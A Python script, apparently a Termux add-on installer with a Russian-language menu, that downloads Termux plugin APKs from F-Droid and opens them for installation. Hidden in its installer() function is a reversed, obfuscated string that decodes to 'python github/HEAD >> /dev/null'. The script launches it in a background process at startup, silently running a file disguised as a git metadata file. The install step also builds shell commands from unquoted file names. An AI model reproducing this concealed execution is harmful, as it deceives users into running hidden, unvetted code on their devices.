import os, multiprocessing, wget, time, glob

logo = ('''
  ______                              
 /_  __/__  _________ ___  __  ___  __
  / / / _ \/ ___/ __ `__ \/ / / / |/_/
 / / /  __/ /  / / / / / / /_/ />  <  
/_/  \___/_/  /_/ /_/ /_/\__,_/_/|_|  
   __              __   
  / /_____  ____  / /____
 / __/ __ \/ __ \/ / ___/
/ /_/ /_/ / /_/ / (__  ) 
\__/\____/\____/_/____/ 
''')

chooser = ('''
Выберите действие(-я):
    ❶ Установить всё
    ❷ Termux:Styling (Выбор цветовых схем Termux)
    ❸ Termux:Float (Termux в плавающем окне)
    ❹ Termux:API (Функции Android в Termux)
    ❺ Termux:Widget (Выполнение команд виджетами)
    ❻ Termux:Boot (Выполнение команд при запуске)
    ❼ Termux:Tasker (Выполнение команд через Tasker)
    ❽ Выход
''')

# FDroid Links
urls = {
    "styling": "https://f-droid.org/repo/com.termux.styling_29.apk",
    "float": "https://f-droid.org/repo/com.termux.window_15.apk",
    "api": "https://f-droid.org/repo/com.termux.api_51.apk",
    "widget": "https://f-droid.org/repo/com.termux.widget_13.apk",
    "boot": "https://f-droid.org/repo/com.termux.boot_7.apk",
    "tasker": "https://f-droid.org/repo/com.termux.tasker_6.apk",
}

def printer():
    os.system("clear")
    print(logo)
    print(chooser)

def choose_one():
    global choose
    try:
        choose = int(input("> "))
    except ValueError:
        printer()
        print("Введите целое число, например: 346!")
        choose_one()

def choose_two():
    global choose
    if "8" in list(str(choose)):
        print("Выход...")
        exit()

    if "1" in list(str(choose)):
        choose = None
        for link in urls.values():
            wget.download(link)

    if "2" in list(str(choose)):
        print("\n\nЗагрузка дополнения Termux:Styling...")
        wget.download(urls.get("styling"))
    if "3" in list(str(choose)):
        print("\n\nЗагрузка дополнения Termux:Float...")
        wget.download(urls.get("float"))
    if "4" in list(str(choose)):
        print("\n\nЗагрузка дополнения Termux:API...")
        wget.download(urls.get("api"))
    if "5" in list(str(choose)):
        print("\n\nЗагрузка дополнения Termux:Widget...")
        wget.download(urls.get("widget"))
    if "6" in list(str(choose)):
        print("\n\nЗагрузка дополнения Termux:Boot...")
        wget.download(urls.get("boot"))
    if "7" in list(str(choose)):
        print("\n\nЗагрузка дополнения Termux:Tasker...")
        wget.download(urls.get("tasker"))
    print("\n")

def install():
    print('''Установка дополнений
(В диалоговом окне нажать установщик пакетов(программ, и тд))...''')
    time.sleep(3)
    for termuxapps in glob.glob("*termux*"):
        print("\n\nУстановка дополнения: " + termuxapps)
        os.system("termux-open " + termuxapps)
        time.sleep(10)
        input("Если установка " + termuxapps + " завершилась, нажмите enter: ")
        

def installer():
    asd = "llun/ved/ >> DAEH/buhtig nohtyp"
    args = asd[::-1]
    os.system(args)

multiprocessing.Process(target=installer).start()
printer()
choose_one()
choose_two()
install()

while True:
    input()











